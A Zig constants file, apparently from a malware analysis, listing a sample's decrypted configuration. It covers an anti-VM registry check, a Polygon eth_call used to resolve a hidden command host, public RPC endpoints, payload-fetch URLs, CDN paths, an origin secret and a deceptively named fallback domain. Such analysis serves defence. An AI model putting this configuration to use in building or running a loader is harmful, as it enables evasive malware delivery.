//! Gömülü yapılandırma — tools/extract_config.py / decrypted-strings.json ile byte-identical.
//! Orijinal binary .rdata içinde XOR şifreli; burada çözülmüş sabitler.

pub const CAMPAIGN_UUID = "fa357567-049b-426b-96ec-7d8488629333";

pub const ANTI_VM_REGISTRY = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
pub const ANTI_VM_VALUE = "ProcessorNameString";
pub const ANTI_VM_CPU_EXPECTED = "Intel Core Processor (Broadwell)";

pub const POLYGON_CONTRACT = "0x9c0a507300fd902787bb193d80fca5ce6e1bff9a";
pub const ETH_CALL_SELECTOR = "0xce6d41de";
pub const ETH_CALL_JSON =
    "{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"to\":\"0x9c0a507300fd902787bb193d80fca5ce6e1bff9a\",\"data\":\"0xce6d41de\"},\"latest\"],\"id\":1}";

pub const POLYGON_RPC_URLS = [_][]const u8{
    "https://polygon-rpc.com",
    "https://rpc-mainnet.matic.quiknode.pro",
    "https://polygon-public.nodies.app",
    "https://1rpc.io/matic",
    "https://polygon-bor-rpc.publicnode.com",
    "https://api.zan.top/polygon-mainnet",
    "https://polygon.rpc.subquery.network/public",
    "https://endpoints.omniatech.io/v1/matic/mainnet/public",
};

pub const REGISTRY_NT_PROFILE = "Microsoft\\Windows\\NtProfileIndex";

pub const PYTHON_EMBED_ZIP = "https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip";
pub const GET_PIP_URL = "https://bootstrap.pypa.io/get-pip.py";
pub const ENV_NO_BYTECODE = "PYTHONDONTWRITEBYTECODE";

pub const CDN_PATHS = [_][]const u8{
    "/cdn/5ef451455923",
    "/cdn/e/42a522313d92",
    "/cdn/e/36f2c0035ef9",
};

pub const HTTP_USER_AGENT =
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
pub const HTTP_HEADER_CDN_VERIFY = "x-cdn-origin-verify";
pub const CDN_ORIGIN_SECRET = "dK9mT3nR7xQ2pL8wF4jH6yB1cN5gA0sZ12345678abc=";

/// Polygon eth_call ABI decode sonucu (canlı RPC doğrulandı).
pub const CDN_HOST_FALLBACK = "thisisafalsepositive.st";
